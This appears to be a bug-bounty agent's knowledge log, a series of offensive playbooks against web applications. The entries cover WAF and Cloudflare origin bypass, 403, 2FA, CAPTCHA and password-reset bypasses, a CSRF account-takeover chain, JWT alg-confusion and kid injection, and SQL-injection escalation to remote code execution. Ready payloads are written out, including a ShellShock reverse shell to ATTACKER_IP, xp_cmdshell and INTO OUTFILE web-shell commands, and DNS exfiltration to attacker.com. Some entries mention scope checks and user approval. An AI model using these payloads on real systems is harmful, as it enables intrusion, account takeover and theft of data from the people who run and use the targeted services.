- [2026-09-04T18:06:16Z] CLOUDFLARE-ORIGIN LADDER — 4 methods to bypass the CF proxy: (1) CloudRip (packs/CloudRip/) — subdomain enum + resolve, filter CF ranges; (2) DNS history — censys.io, securitytrails.com, viewdns.info archived A records; (3) SSL cert Common Name matching — crt.sh 'searchable-json?q=%25.target.com'; (4) mail server headers — send email to nonexistent@target.com, inspect the bounce SMTP headers for origin MTA IP. If any origin IP found, test with 'Host: target.com' header on that IP — often the whole app responds without CF. Combine with dev/staging subdomains (dev.target.com, staging.target.com, api-dev.target.com) which frequently skip CF entirely.
- [2026-09-04T18:06:16Z] SHADOWSOCK5/POC MAP — 72 vendor dirs at packs/Poc/ for enterprise CVE POCs. Highest bounty-relevance: Confluence, Jira, Bitbucket, Jenkins, GitLab, Grafana, Nexus, Exchange, ActiveMQ (chain-friendly), Weblogic, Nacos. Workflow: (1) t3-recon fingerprints target → matches vendor dir name; (2) 'ls packs/Poc/<Vendor>/' → list ready POCs; (3) read the specific CVE .md/.py, adapt payload to target's version; (4) run receipt_required against the target only after explicit user OK. NEVER run these POCs from packs/Poc/ directly against a target — they may be destructive; adapt and sanitize first.
- [2026-09-04T18:15:41Z] WAF BYPASS TECHNIQUE CATALOG — the 8 tricks that get past most CDN/WAFs when payload fires against origin cleanly: (1) case variations SeLeCt/UnIoN (rule matches /select/i but backend is case-insensitive already); (2) inline comment injection SE/**/LECT and SE//LECT (MySQL parses comments inside keywords); (3) parameter pollution ?id=1&id=2 (WAF checks LAST value, backend uses FIRST — or vice versa); (4) HTTP method swap GET→POST→PUT→PATCH→DELETE — WAF often only inspects the outer verb, backend routes to same handler; (5) content-type swap form-data→application/json→application/xml — some WAFs skip parsing JSON/XML bodies; (6) HTTP/2 cleartext (h2c upgrade) — some WAFs only inspect HTTP/1.1; (7) multi-encoding chain URL→double-URL→unicode→HTML-entity — %2527 becomes ' after decode; (8) origin-IP bypass (see CLOUDFLARE-ORIGIN LADDER lesson) — if you find the origin, most WAFs are proxy-only and bypass entirely. Run this checklist BEFORE reporting 'WAF-blocked, not exploitable'.
- [2026-09-04T18:15:41Z] PASSWORD-RESET TOKEN LEAK — the low-hanging critical. Test order: (1) request reset for target@victim.com; (2) inspect the HTTP RESPONSE (not just email) for the token — check JSON body, page HTML source, redirect Location header, X-* custom headers; (3) inspect email HEAD/preheader — some apps put the raw token in the email preview text before the click-through URL; (4) confirm token by using it to reset without clicking the email. Frequently seen: /api/reset returns {"success":true,"token":"..."} to client — token IS the reset key. IDOR variants: reset request for user X returns token in your session's response payload — full ATO. Always chain to account takeover for max bounty.
- [2026-09-04T18:15:41Z] 2FA BYPASS SHORT LIST — test in this order before dispatching auth-tester agent: (1) remove the 2fa parameter from the request body/JSON entirely (2fa_code deleted, not empty); (2) set 2fa_verified=true / mfa_completed=true / has_2fa=false in body or JWT claims; (3) REPLAY the successful login request (before 2FA step) — some flows set the session cookie pre-2FA; (4) inject ?bypass=1 ?skip_2fa=1 ?trust_device=true; (5) response-manipulation: if login returns {"require_2fa":true}, intercept + flip to false in response, client sends the 2FA-complete request; (6) endpoint enumeration — /api/2fa/verify/skip, /api/2fa/backup-codes, /api/mfa/disable often exist without auth; (7) rate-limit token brute — 6-digit codes with no lockout = ~500k requests to exhaust. Always chain 2FA-bypass → account takeover for critical severity.
- [2026-09-04T18:15:41Z] WAF DETECTION QUICK-CHECK — before wasting cycles on WAF-bypass payloads, know what you're facing. One-liner: curl -sI https://target.com | grep -iE 'server|cdn|cf-|x-|via|akamai|imperva|sucuri|fastly'. Signals: 'cf-ray' + 'server: cloudflare' = Cloudflare; 'x-akamai-transformed' or 'akamaighost' = Akamai; 'x-iinfo' or 'incap_ses' = Imperva Incapsula; 'x-sucuri-id' = Sucuri; 'x-cdn' + 'fastly' = Fastly; 'server: awselb' + no CF/Akamai headers = raw AWS ALB (no WAF unless AWS WAF cookie present). If NO CDN/WAF detected → probably origin exposed directly → no bypass needed. Escalate to wafw00f (in arsenal) for deeper fingerprinting only when the quick-check is ambiguous.
- [2026-09-04T18:27:21Z] SECRETS SCANNING WRAPPER — the workflow-integrated way (supersedes the ad-hoc pattern earlier). Single entry point: 'bash scripts/secrets-scan.sh <path>' — runs trufflehog + gitleaks with pre-generated configs (brain/registry/secrets-rules/{trufflehog-v3.yml, gitleaks.toml}) derived from packs/secrets-patterns-db (1610 patterns, mazen160). Flags: --high-only (883 high-confidence patterns), --scanner {trufflehog|gitleaks|both}, --verify (RECEIPT_REQUIRED — hits provider APIs), --rebuild-rules (regen from pack after update), --out <dir> (persist JSON). Exit 0=clean, 1=hits. Prints verification recipes per-provider (AWS sts, GitHub /user, Slack auth.test, Google maps API) on hit — always confirm LIVE before reporting. Verified end-to-end on synthetic .env — gitleaks found 10 secrets, trufflehog 55 (broader + BASE64 decoder). This is the Tier 2 sweep; the 26-pattern grep-oneliner in info-disclosure agent stays as Tier 1 for quick single-file checks.
- [2026-09-04T18:32:29Z] AWESOME-BUGBOUNTY-WRITEUPS pack — devanshbatham's curated 600-writeup index (packs/Awesome-Bugbounty-Writeups/README.md). Category-organized: XSS 294 (dominant, use for XSS deep-study), RCE 68, CSRF 49, SQLi 34, SSRF 27, CORS 15, LFI 13, IDOR 5, 2FA 10, race 12, auth-bypass 12, clickjacking 22, DOS 11, subdomain-takeover 22, BOF 6, Android 1. 130 URLs deduped-folded into writeup-corpus metadata.db (now 6879 rows total) — automatically searchable via mcp__writeup-search__search_writeups. Use for class deep-study: 'sqlite3 ~/.local/share/pentest-writeups/metadata.db "SELECT title, source FROM writeups WHERE tags LIKE %XSS% LIMIT 20"' — 294 XSS writeups sorted by class-tag. For the raw README with all 600 entries + category headers, cat packs/Awesome-Bugbounty-Writeups/README.md.
- [2026-09-04T19:05:24Z] OPERATOR-INTEGRATION TEST SURFACE (tests/e2e/) — 110 assertions across 2 suites, exercises the /mad-hunt organism at pipeline level. test_scope_boundary.py (45): scope.py against 14 adversarial variants (suffix confusion, IPv6-mapped IPv4, creds-injection, IDN, wildcard depth, trailing-dot, mixed-case, deny-wins) + fail-closed invariant (engagement-state.sh init --scope-check refuses OUT-OF-SCOPE with exit 4, no filesystem touch). test_engagement_e2e.py (65): synthetic 11-hop walk of scope→state→recon→classifier→recall→exhausted-demote→hypothesis-boost→evidence→verifier-input→report-input→brain-learn. Runs in ~30s. bash tests/e2e/run-all.sh. Discovered + closed real security gap in same commit: engagement-state.sh init previously had no scope check — added --scope-check <path> flag with default fail-closed behavior on discoverable .t3mp3st/SCOPE.md, --no-scope-check escape hatch for tests. Combined with tests/intelligence/ = 159 total assertions. Use bash tests/run-all.sh for full regression.
- [2026-09-04T19:17:28Z] AGENT PORTABILITY + PROVENANCE (2026-09-05) — 55 agents now repo-canonical at agents/{hunters,operators}/ with sha256-anchored manifest at agents/manifest.json. Bootstrap contract: 'python3 scripts/agents-manifest.py; bash scripts/agents-sync.sh' → same runtime on any machine. 'bash scripts/agents-verify.sh' is read-only drift detection: reports MISSING (not installed), MODIFIED (sha256 mismatch), UNSATISFIED (declared requires_scripts/references missing from repo). --strict fails on unsatisfied; --json is machine-readable. Fresh-machine simulation + corruption + deletion + self-consistency covered by test_agent_portability.py (255 assertions). Total suite now 414+ assertions across retrieval+state+operator+portability. Repo layout: agents/hunters/ (31 files, incl. auth-tester/js-analyzer/vuln-scanner re-classed as hunters), agents/operators/ (24 files, incl. moved t3-*/sast-*/scope-check/validator/brain/correlator/chain-builder/monitor/nuclei-writer/poc-builder/quality-check/recon-ranker/report-writer). ~/.claude/agents is a REPLICA, never canonical.
- [2026-09-04T19:27:41Z] ENDPOINT 403 BYPASS LADDER (from bounty_tips_100 pages 79/95/106) — when /api/v1/users/{id} returns access-denied, try IN ORDER before giving up: (1) append .json/.xml → some backends bypass auth on file-extension routing; (2) append trailing ?/??/# → some servers strip and re-route; (3) inject path-param tricks: {id}..;/ (Jetty), {id}\..\.\getUser (path-collapse), {id}%2e (encoded dot); (4) version rotation: v1→v2→v3 (older or new versions often skip new auth checks); (5) sub-path append: {id}/email or {id}/settings — sometimes auth only on the exact leaf; (6) subdomain-shift: www.site.com/api → site.com/api (different auth service); (7) merged-id trick: /users/{your_id}${victim_id} — some parsers concatenate; (8) header-based: X-Original-URL: /admin OR Referer: https://target.com/admin (Apache X-Original-URL, Symfony/Rails Referer trust). brain/payloads/api-auth-bypass.txt has 82 seeded variants. Run this ladder BEFORE reporting the endpoint as un-bypassable.
- [2026-09-04T19:27:41Z] 403 BYPASS TECHNIQUE CATALOG (page 85 of bounty_tips_100) — 6 methods when /admin returns 403: (1) IP-spoof headers: X-Custom-IP-Authorization/X-Forwarded-For/X-Real-IP/X-Client-IP: 127.0.0.1 — many corp WAFs whitelist internal IPs; (2) unicode char insertion: /%cadmin, /%bdmin (some proxies decode after routing); (3) path variations: /admin/., /admin;/, /admin/~, /admin?param, /admin#, /admin%20, /%2e/admin, /accessible/../admin — case-collapse quirks; (4) method-swap: GET→POST→PUT→PATCH (WAF often only inspects specific verbs); (5) direct IP or vHost: use the raw IP or Host: internal-name to bypass the frontend router; (6) fuzz further: dirsearch -u <host> -i 403 -e php,html,json,aspx,sql,asp,js,txt to find MORE 403s, then run 403bypasser (github.com/smackerdodi/403bypasser) on the list. Tool: pip3 install dirsearch.
- [2026-09-04T19:27:41Z] PASSWORD-RESET EMAIL-INJECTION LADDER (pages 56, 90 of bounty_tips_100) — 7 attack vectors when target has a /passwordreset endpoint: (1) parameter pollution: email=victim@x.com&email=attacker@x.com — WAF checks first, backend uses last; (2) CRLF injection: email=victim@x.com%0d%0acc:attacker@x.com — leaks reset link via header injection; (3) comma-separated: email=victim@x.com,attacker@x.com — some parsers deliver to BOTH; (4) space-injection: email=victim@x.com%20attacker@x.com; (5) JSON array: {"email":["victim@x.com","attacker@x.com"]}; (6) Host-header injection: X-Forwarded-Host: attacker.com (reset link built from Host header, leaks to attacker); (7) token attack surface — check if token reflected in response (JSON body → immediate ATO), token brute-force (no rate limit), token-reuse across accounts, empty-token, huge-token, previously-used token. Chain: password-reset primitive → CRITICAL if any works. brain/payloads/api-auth-bypass.txt also has related endpoint variants.
- [2026-09-04T19:27:41Z] CAPTCHA BYPASS LADDER (page 44 of bounty_tips_100) — 5 methods before giving up on a CAPTCHA-protected form: (1) HTTP method swap POST→GET / POST→PUT → some CAPTCHA middleware only validates on specific verbs; (2) remove the CAPTCHA parameter entirely from the request — backend may not require it if absent (implicit optional); (3) re-use an old captcha value (no server-side burn check); (4) convert JSON body to form-urlencoded params (or vice-versa) — CAPTCHA layer only parses one content-type; (5) inject IP-spoof headers (X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1) to appear as internal traffic that bypasses CAPTCHA. Combine: change method + change content-type + spoof IP for compounded bypass. Also test rate-limit bypass side-channel — many CAPTCHAs are rate-limit triggered; if you can spoof source IP each request, no rate limit, no CAPTCHA.
- [2026-09-04T19:27:41Z] CSRF ATO CHAIN via confirmation-link email trick (page 68 of bounty_tips_100) — full account takeover using an email-change endpoint even WITH a confirmation-link challenge: (1) attacker adds their own email 'attacker@gmail.com' to attacker account the intended way, confirms via email link; (2) attacker REMOVES the email from their account (email is now 'used' — backend has seen it as valid); (3) attacker crafts a CSRF exploit that submits 'attacker@gmail.com' as a new email on VICTIM's session; (4) when victim triggers the CSRF, backend sends confirmation email to attacker@gmail.com; (5) attacker manipulates the confirmation link's ?redirect= param to /home (or omits it) so victim, after clicking, lands on home instead of the profile-settings page — victim never sees 'email added' notification; (6) attacker's email is now attached to victim's account, allowing password reset → ATO. Chain requires: CSRF on email-add + confirmation-link-not-scoped-to-session + redirect-param controllable.
- [2026-09-04T19:27:41Z] APPLICATION-LOGIC FEATURE-FLAG BYPASS via DevTools (page 36 of bounty_tips_100) — free/paid tier apps often ship BOTH feature sets to the client and gate them with a disabled='true' attribute or a hidden CSS class. Workflow: (1) trigger the paid feature, get a payment redirect; (2) navigate BACK to the page (browser back button); (3) F12 → Inspect the element for the paid button/link; (4) look for disabled/hidden/data-tier=free attributes; (5) flip disabled→enabled (or remove hidden), click. If backend validates on server → nothing happens (informational). If backend trusts the client-side flag → PAID FEATURE ACCESSED. Also test: local storage flags, session storage flags, ?tier=paid URL params, ?is_premium=true. Often lands P4 informational but sometimes chains: e.g., paid-feature is an admin panel → privesc → critical. Doesn't need Burp — devtools alone.
- [2026-09-04T19:27:41Z] CACHE-CONTROL SESSION BUG via back-button (page 55 of bounty_tips_100) — a small but paying bug class: after logout, browser cache may still hold post-auth pages accessible via Alt+Left / browser-back. Test: (1) login; (2) navigate to /account, /dashboard, or any post-auth page; (3) logout; (4) press Alt+Left (or the back button). If the page RE-RENDERS with the logged-in view (not a 401/redirect-to-login), the app is missing Cache-Control: no-store, no-cache, must-revalidate on sensitive pages. Report as CWE-525 (Web Browser Cache-Control) — usually P4 informational unless the cached page contains sensitive PII or session tokens (then P3). Fix: server MUST send Cache-Control: no-store on any authenticated response. Quick check: curl -sI https://target.com/dashboard -b 'session=X' | grep -i cache-control.
- [2026-09-04T19:27:41Z] ALIENVAULT OTX ASSOCIATED-URLS RECON (page 17 of bounty_tips_100) — free semi-passive recon source that indexes historic URLs from OTX threat feeds. Method: visit https://otx.alienvault.com/indicator/domain/<target> — scroll to 'Associated URLs' section. Yields: (a) URLs that disclose sensitive info about other users (receipts, order confirms with PII); (b) auth-token-in-URL patterns; (c) IDOR paths with numeric IDs; (d) interesting parameters/files not in wayback machine or crt.sh; (e) admin panel URLs indexed from historic scans. Complement to wayback + gau + hakrawler recon. No auth, no rate limit apparent. Add to recon.sh Phase A recon sources: 'otx.alienvault.com/indicator/domain/<TARGET>'. Grep the associated-URLs output for: /reset, /token=, /confirm=, /export, /admin, /debug, /pdf, /invoice, /receipt.
- [2026-09-04T19:27:41Z] SHELLSHOCK cgi-bin PROBE (page 86 of bounty_tips_100) — CVE-2014-6271 lives on for legacy targets. If recon surfaces /cgi-bin/*, /cgi/*, .cgi, .pl endpoints OR any perl/bash CGI, test via User-Agent: 'User-Agent: () { :;}; echo $(</etc/passwd)' — if response body leaks /etc/passwd content, ShellShock confirmed. Escalation: 'User-Agent: () { :;}; /usr/bin/nc ATTACKER_IP 4444 -e /bin/bash' (reverse shell) OR 'User-Agent: () { :;}; curl http://BURP_COLLAB/$(hostname)' (blind OOB confirm). Also test via Referer, Cookie, X-Forwarded-For headers — many parsers pass them to bash env. Rare but pays big when found — nearly always P1 (RCE, unauth). brain/payloads/cmdi.txt seeded with 3 variants.
- [2026-09-04T19:27:41Z] BLIND-XSS INJECTION-POINT CATALOG (page 3 of bounty_tips_100) — where to plant blind XSS payloads (blindly wait for admin/support to view them): (1) contact-us forms + support tickets — support agents view in a custom back-office; (2) password fields on registration/reset (some apps show cleartext to admins for 'audit' — dangerous!); (3) shipping/billing address fields on e-commerce checkout — CS reps view orders in admin panel; (4) First/Last Name during credit-card payment — some payment gateway back-offices reflect this; (5) User-Agent header via Burp — WAF/log-analysis dashboards often reflect UA raw; (6) profile bio, comment section, review text — anywhere an admin sees user-generated content. Use a distinctive OOB payload (e.g., XSS Hunter, or dalfox --blind-oob) so you catch the fire even weeks later. Chain: blind XSS on support agent → session cookie theft → admin-panel access → mass ATO.
- [2026-09-04T19:27:41Z] HIDDEN PARAMETER DISCOVERY via JS-var-name recon (page 35 of bounty_tips_100) — apps often ship JS bundles that declare variables like 'var test = ...' where the variable name matches a HIDDEN GET/POST parameter the backend accepts (dev-mode debug params). Workflow: (1) assetfinder example.com | gau | httpx — collect live URLs; (2) for each URL, curl -s and grep -Eo 'var [a-zA-Z_0-9]+' to extract var names; (3) uniq → append each as ?var_name=<probe> to the URL; (4) fire and check for reflection, error diffs, or behavior change. Common finds: ?debug, ?test, ?admin, ?internal, ?raw, ?dryrun, ?verbose, ?trace. Chain: hidden param → XSS reflection (?test=<probe>) OR SSRF (?url=) OR IDOR (?userid=). Also grep JS for pushState/history.pushState — hidden state parameters.
- [2026-09-04T22:57:51Z] JWT PENTEST CHECKLIST (Chintan Gurjar 27-test) — the canonical ladder to run when a target uses JWTs. In priority order: (1) sensitive info in claims — decode payload, grep for passwords/keys/internal IPs; (2) signature not verified — modify {role:user→admin} keep sig, retry; (3) alg:none — set alg=none/None/NONE/nOnE, drop sig, retry; (4) weak HMAC secret — hashcat mode 16500 with common secrets (secret, password, your-256-bit-secret, JWT-Secret); (5) alg confusion RS256→HS256 — sign with target's RS256 pubkey as HMAC key; (6) missing/ignored exp — remove exp or set 9999999999; (7) aud claim not enforced — replay token from Service A on Service B; (8) modifying payload without sig — sanity re-check (some libs accept); (9) client-side token generation — grep JS bundle for signing logic; (10) excessive lifetime — check exp; (11) embed pubkey via jwk header (CVE-2018-0114); (12) jku spoofing — set jku to attacker JWKS URL; (13) kid parameter injection — path traversal (../../etc/passwd), SQLi (' UNION SELECT --), cmdi (); (14) SSRF via x5u/jku headers — internal URL fetches; (15) x5c self-signed cert; (16) ES256 nonce reuse; (17) predictable jti → replay; (18) cross-service relay; (19) time-claim enforcement (exp/nbf/iat); (20) deprecated algs (HS1, MD5); (21) missing iat; (22) insecure client-side storage (localStorage → XSS steals); (23) no revocation; (24) HTTP transmission; (25) JWT-as-session flaws; (26) CSRF vulnerable when in cookie without SameSite; (27) XSS steals stored JWTs. brain/payloads/jwt.txt seeded. Every #1-#5 attack pays P1/P2 when it works.
- [2026-09-04T22:57:51Z] SQL INJECTION FORCED-ERROR MATRIX (nav1n0x PDF) — when a target throws detailed errors, use forced-error payloads to leak DB metadata WITHOUT UNION. Per DBMS: MySQL: (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) — the FLOOR(RAND()) duplicate-key error leaks the CONCAT result. PostgreSQL: 1=CAST((SELECT current_database()) AS INT) — cast error leaks value. MSSQL: 1=CAST(DB_NAME() AS INT) — same trick. Oracle: 1=CAST((SELECT ora_database_name FROM dual) AS INT). SQLite: 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT). To leak HOSTNAME instead: MySQL @@hostname, PostgreSQL inet_server_addr(), MSSQL @@servername, Oracle SYS_CONTEXT('USERENV','HOST'), SQLite pragma_database_list.file. To force DBMS-specific errors when fingerprinting: MySQL EXP overflow, PostgreSQL invalid regex 'b[', MSSQL invalid XML, Oracle XMLType('<invalid>'), SQLite POW('text',2). brain/payloads/sqli.txt seeded with per-DBMS matrix.
- [2026-09-04T22:57:51Z] SQL INJECTION → RCE ESCALATION PATHS (nav1n0x PDF advanced techniques) — when SQLi confirmed, follow this per-DBMS escalation tree to RCE: MSSQL: (a) xp_cmdshell if privileged: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; (b) OLE Automation via sp_OACreate 'WScript.Shell'; (c) linked-server relay: sp_addlinkedserver 'attacker' then EXEC AT. MySQL: (a) INTO OUTFILE '/var/www/html/shell.php' with '<?php system(); ?>' if FILE priv + writable web root; (b) UDF via lib_mysqludf_sys.so — CREATE FUNCTION sys_exec RETURNS INTEGER; (c) binary log injection: SET GLOBAL general_log_file='/var/www/html/shell.php'. Oracle: (a) Java stored procedures via dbms_java.grant_permission → CREATE JAVA SOURCE 'cmd' + Runtime.getRuntime().exec(); (b) UTL_FILE for file write; (c) DBMS_SCHEDULER for job execution + privilege change. Also OOB DNS exfil: xp_dirtree '\\attacker.com\payload' (MSSQL), LOAD_FILE(CONCAT('\\',DATA,'.attacker.com\a')) (MySQL). If none work, fall back to LFI via LOAD_FILE('/etc/passwd') or file:///etc/passwd. brain/payloads/sqli.txt has the payloads.
- [2026-09-04T22:57:51Z] SQLMAP TAMPER-SCRIPT CATALOG (nav1n0x PDF) — when default sqlmap payloads get 403/blocked, cycle tamper scripts. High-signal set to try in order: apostrophemask, apostrophenullencode, appendnullbyte, base64encode, between, bluecoat, chardoubleencode, charencode, charunicodeencode, concat2concatws, equaltolike, greatest, halfversionedmorekeywords, ifnull2ifisnull, modsecurityversioned, modsecurityzeroversioned, multiplespaces, nonrecursivereplacement, percentage, randomcase, randomcomments, securesphere, space2comment, space2dash, space2hash, space2morehash, space2mssqlblank, space2mssqlhash, space2mysqlblank, space2mysqldash, space2plus, space2randomblank, sp_password, unionalltounion, unmagicquotes, versionedkeywords, versionedmorekeywords. Command: sqlmap -u URL --tamper=space2comment,between,randomcase --level=5 --risk=3. When ALL fail: write a custom tamper — nav1n0x PDF pages 7-9 have the template (Python: __priority__=1, def dependencies(), def tamper(payload)). Save to /path/to/tamper.py then sqlmap --tamper=/path/to/tamper.py.
- [2026-09-04T22:57:51Z] API-VERSION ROTATION for AUTH-ENDPOINT BYPASS (BrokenAuth PDF crAPI lab) — proven pattern from the crAPI (apisec.ai) practice lab: /api/v3/check-otp rate-limits OTP brute-force after 10 attempts (503 'exceeded number of attempts'), but /api/v2/check-otp uses the SAME handler WITHOUT the rate-limit middleware — brute-forced 4-digit OTP in ~5030 requests, got 200 'OTP verified'. Apply this pattern to EVERY authentication endpoint. Ladder: (1) POST /api/v3/foo → rate-limited/blocked → (2) try /api/v2/foo, /api/v1/foo, /api/beta/foo, /api/legacy/foo, /api/internal/foo, /rest/v1/foo, /_api/foo. Also try version in HEADER: 'Accept: application/vnd.api.v1+json' or 'X-Api-Version: 1'. Backend often runs older versions in parallel (deprecated but not removed) — they inherit the endpoint logic but not the security middleware. Chain: version-rotation → OTP brute → password reset → full ATO. brain/payloads/mfa-bypass.txt has the endpoint variants + OTP-bypass parameter tampering.
- [2026-09-04T22:57:51Z] JWT alg-CONFUSION ATTACK STEP-BY-STEP (Chintan Gurjar checklist test #5) — this is the JWT attack that pays highest bounties. Prerequisite: target uses RS256 (asymmetric) AND server's JWT library trusts the ALG header value. Steps: (1) obtain a valid JWT and decode header — confirm 'alg':'RS256'; (2) find the server's RS256 PUBLIC KEY (usually at /.well-known/jwks.json, /auth/certs, or in JS bundle metadata, or via jku header if allowed); (3) craft new payload with escalated claims: {role:'admin',user_id:1,is_admin:true}; (4) MODIFY the header alg from 'RS256' to 'HS256'; (5) new_sig = HMAC-SHA256(base64url(header) + '.' + base64url(payload), <RAW PUBLIC KEY BYTES>) — many libraries pass the pubkey PEM as the HMAC secret because they see alg=HS256; (6) assemble new_token = header.payload.new_sig; (7) send to any authenticated endpoint. If server accepts → full ATO (auth bypass). Tool: jwt_tool.py --exploit a (Ticarpi's toolkit). ALWAYS test — even 2024-era JWT libraries still have this bug when the developer wrote their own verify wrapper.
- [2026-09-04T22:57:51Z] JWT kid PARAMETER — the underrated triple-attack (Chintan Gurjar test #13) — the 'kid' (Key ID) header is often used by the server to LOOKUP the signing key from a DB, filesystem, or system call. This makes it a three-way vulnerability: (a) PATH TRAVERSAL: kid='../../../dev/null' — many libs read from filesystem, kid pointing to /dev/null yields empty-key which HMAC-SHA256 accepts if you sign with empty secret; (b) SQL INJECTION: kid="a' UNION SELECT 'attacker_secret' -- " — if backend does 'SELECT key FROM keys WHERE kid=?' with string concat, you inject your own known secret; (c) COMMAND INJECTION: kid='a;curl BURP_COLLAB;#' — if backend does system('key-lookup ' + kid), your OOB fires. Test ALL THREE for every JWT-using target — the pay-out varies (path-traversal is P2, SQLi is P1, cmdi is P0). brain/payloads/jwt.txt has ready-to-paste variants.
- [2026-09-04T22:57:51Z] BROKEN AUTHENTICATION taxonomy (Harsh Patel CyberSapiens paper) — 5 canonical attack primitives to test on every auth surface: (1) CREDENTIAL STUFFING: attacker has DB of leaked email:password from breach — try each against target's /login (works because ~65% of users reuse passwords); mitigation-side check: does /login rate-limit per SOURCE_IP or per USERNAME? Per-IP is bypassable via proxy rotation; per-username is stronger. (2) PASSWORD SPRAYING: reverse — one weak password across many usernames (avoids per-user lockout). Top 5 to try: 123456, password, admin, welcome, <company>2024. (3) PHISHING: out-of-scope for bug bounty but worth understanding — 35% of breaches (CrowdStrike 2020). (4) WEAK PASSWORDS: check the password policy — if <8 chars accepted or common passwords accepted, report. (5) IMPROPER SESSION MANAGEMENT: session tokens predictable/sequential, no timeout, no invalidation on logout, no rotation on privesc, transmitted over HTTP. Chain: any of these primitives → ATO → data exfil → CRITICAL. Combine with API-version-rotation lesson for compound bypass.
